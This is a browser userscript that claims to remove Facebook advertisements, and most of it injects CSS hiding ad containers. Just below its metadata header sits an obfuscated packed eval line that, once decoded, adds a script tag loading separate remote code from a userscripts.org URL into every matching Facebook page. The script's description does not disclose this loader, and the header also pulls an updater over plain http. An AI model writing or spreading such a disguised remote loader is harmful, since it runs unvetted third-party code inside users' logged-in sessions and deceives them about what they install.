// ==UserScript==
// @name          Remove Facebook Ads Plus + Last Update
// @namespace     sizzlemctwizzle
// @description   Uses a small amount of CSS to remove advertisements
// @require       http://sizzlemctwizzle.com/updater.php?id=46560
// @version       1.5.7
// @run-at        document-start
// @unwrap
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include       http://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function() {
  function appendStyle(h) {
    var head = h || document.getElementsByTagName('head')[0], 
        style = document.createElement('style');
    if (!head || self.location != top.location) {return}
    style.type = 'text/css';
    style.textContent = '#right_column { width: 77% !important; }' +
                    ' .ad_capsule, #sidebar_ads, .adcolumn, .emu_sponsor' +
                    ', div[id^="emu_"], .social_ad, .sponsor, .footer_ad,' +
                    ' #home_sponsor, .house_sponsor, #home_sponsor_nile, ' +
                    '.PYMK_Reqs_Sidebar, .ego_header, .ego_unit, ' +
                    '.UIStandardFrame_SidebarAds { display:' +
                    ' none !important; } #wallpage { width: 700px !important; }' +
                    '.LSplitView_ContentWithNoLeftColumn, ' +
                    '.FN_feedbackview { width: 100% !important; }';
    head.appendChild(style);
  }

  function nodeInserted(e) {
    if (e.relatedNode.tagName == "HEAD") {
      document.removeEventListener('DOMNodeInserted', nodeInserted, true);
      appendStyle(e.relatedNode);
    }
  }

  // Url matching for Opera
  if (window.opera && 
      !/http:\/\/.*\.facebook\.com\/.*/.test(window.location.href))
    return;

  // Early injection support
  if (document.body === null)
    document.addEventListener('DOMNodeInserted', nodeInserted, true);
  else
    appendStyle();
})();